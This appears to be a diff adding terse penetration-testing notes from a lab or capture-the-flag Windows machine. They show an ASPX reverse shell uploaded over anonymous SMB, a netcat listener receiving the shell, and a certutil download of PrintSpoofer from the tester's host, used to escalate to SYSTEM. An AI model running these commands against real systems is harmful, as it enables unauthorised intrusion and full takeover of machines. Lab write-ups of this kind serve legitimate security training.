@@ -49,13 +49,78 @@ Bill - Juw4nnaM4n420696969!$$$
 └─# 
 
 
+change ip address
+
+
+
+https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
+
+we can  visit and view smb contents on 
+
+http://10.65.146.55:49663/nt4wrksv/passwords.txt
+
+
+┌──(root㉿kali)-[~kali]
+└─# smbclient //10.65.146.55/nt4wrksv -N                                          
+Try "help" to get a list of possible commands.
+smb: \> put borjmzrevshell.aspx 
+putting file borjmzrevshell.aspx as \borjmzrevshell.aspx (202.4 kb/s) (average 202.4 kb/s)
+smb: \> 
+
+visit the file on 49663
+
+┌──(root㉿kali)-[/home/kali]
+└─# rlwrap -cAr nc -lvnp 53 
+listening on [any] 53 ...
+connect to [192.168.141.97] from (UNKNOWN) [10.65.146.55] 49826
+Spawn Shell...
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
 
 
 
 
+c:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+c:\windows\system32\inetsrv>
 
 
+c:\Users\Bob\Desktop>certutil.exe -f -urlcache http://192.168.141.97/PrintSpoofer64.exe PrintSpoofer.exe
+certutil.exe -f -urlcache http://192.168.141.97/PrintSpoofer64.exe PrintSpoofer.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
 
+c:\Users\Bob\Desktop>PrintSpoofer.exe -i -c cmd.exe
+PrintSpoofer.exe -i -c cmd.exe
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+C:\Windows\system32>
 
 
 
